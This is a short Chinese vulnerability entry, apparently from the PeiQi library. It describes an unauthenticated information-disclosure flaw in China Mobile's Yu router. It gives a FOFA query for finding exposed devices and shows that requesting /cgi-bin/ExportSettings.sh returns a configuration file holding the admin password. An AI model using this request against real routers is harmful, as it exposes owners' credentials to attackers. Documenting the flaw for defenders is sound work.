---
title: 中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - 中国移动
---

# 中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞

## 漏洞描述

中国移动 禹路由 ExportSettings.sh 存在敏感信息泄露漏洞，攻击者通过漏洞获取配置文件，其中包含账号密码等敏感信息

## 漏洞影响

> [!NOTE]
>
> 中国移动 禹路由

## FOFA

> [!NOTE]
>
> title="互联世界 物联未来-登录"

## 漏洞复现

登录页面如下

![image-20210618173233203](/img/20210924020255121946.png)

访问Url

```
/cgi-bin/ExportSettings.sh
```

![image-20210618180802731](/img/20210924020255307940.png)

其中password为登录后台密码